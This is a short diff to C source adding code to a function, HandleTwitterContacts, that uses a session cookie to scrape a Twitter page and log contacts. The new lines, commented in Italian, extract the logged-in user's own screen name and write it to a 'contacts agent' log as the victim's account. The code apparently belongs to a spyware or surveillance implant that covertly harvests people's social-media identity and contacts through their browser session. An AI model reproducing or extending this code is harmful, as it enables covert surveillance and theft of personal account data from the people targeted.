@@ -153,7 +153,9 @@ DWORD HandleTwitterContacts(char *cookie)
 	DWORD response_len;
 	char *parser1, *parser2;
 	char user[256];
+	WCHAR user_name[256];
 	static BOOL scanned = FALSE;
+	HANDLE hfile;
 
 	CheckProcessStatus();
 
@@ -181,6 +183,22 @@ DWORD HandleTwitterContacts(char *cookie)
 	}
 	*parser2=0;
 	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+
+	// Cattura il proprio account
+	parser1 = parser2 + 1;
+	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
+	if (parser1) {
+		parser1 += strlen("data-screen-name=\"");
+		parser2 = (char *)strchr((char *)parser1, '\"');
+		if (parser2) {
+			*parser2=0;
+			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);		
+			DumpContact(hfile, CONTACT_SRC_TWITTER, user_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
+			Log_CloseFile(hfile);
+		}
+	}
+	
 	SAFE_FREE(r_buffer);
 	scanned = TRUE;
 
